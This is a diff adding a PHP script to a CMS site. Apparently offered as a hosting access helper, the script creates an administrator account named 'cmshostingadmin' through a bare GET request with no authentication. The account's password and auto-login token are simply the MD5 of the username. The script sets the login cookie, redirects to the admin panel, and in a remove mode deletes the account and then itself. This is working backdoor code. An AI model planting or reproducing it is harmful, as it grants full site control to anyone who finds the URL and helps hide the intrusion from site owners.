@@ -1,0 +1,66 @@
+<?php
+​
+$own_path=getcwd();
+require_once $own_path.'/cms/kernel/prog/header.inc.php';
+require_once(SB_CMS_LIB_PATH.'/prog/sbFunctions.inc.php');
+​
+$user='cmshostingadmin';
+​
+if (isset($_GET['mode']) && ($_GET['mode']=='add' || $_GET['mode']=='remove'))
+{
+    $u_id='';
+    $res=sql_query('SELECT u_id FROM sb_users WHERE u_login=?',$user);
+    if ($res)
+    {
+        $u_id=$res[0][0];
+    }
+​
+​
+  if ($_GET['mode']=='add')
+  {
+      $row=array(
+        'u_auto_login'=>md5($user),
+        'u_login'=>$user,
+        'u_pass'=>md5($user),
+        'u_name'=>$user,
+        'u_admin'=>1,
+        'u_reg_date'=>mktime()
+    );
+      if ($u_id)
+      {
+          sql_query('UPDATE sb_users SET ?a WHERE u_id=?d',$row,$res[0][0]);
+      }
+      else
+      {
+          $res=sql_query('SELECT cat_id FROM sb_categs WHERE cat_ident="pl_users" AND cat_title="Администраторы"');
+          if ($res) {
+              sbProgAddElement('sb_users', 'u_id', $row, array($res[0][0]));
+          }
+          else
+          {
+              echo 'Admins not found';
+              exit(0);
+          }
+      }
+      setcookie ("sb_auto_login", md5($user));
+      header('Location:/cms/admin/');
+  }
+    else
+    {
+        if ($u_id)
+        {
+            sbProgDeleteElement('sb_users', 'u_id', $u_id, 'pl_users');
+            echo 'User deleted. ';
+        }
+        else
+        {
+            echo 'User not found. ';
+        }
+        unlink($_SERVER['SCRIPT_FILENAME']);
+        echo 'File deleted';
+    }
+}
+else
+{
+    echo '<html><body><center><br><br><a href="'.$_SERVER['SCRIPT_NAME'].'?mode=add">Create and login</a><br><br><a href="'.$_SERVER['SCRIPT_NAME'].'?mode=remove">Delete user and file</a></center></body></html>';
+}
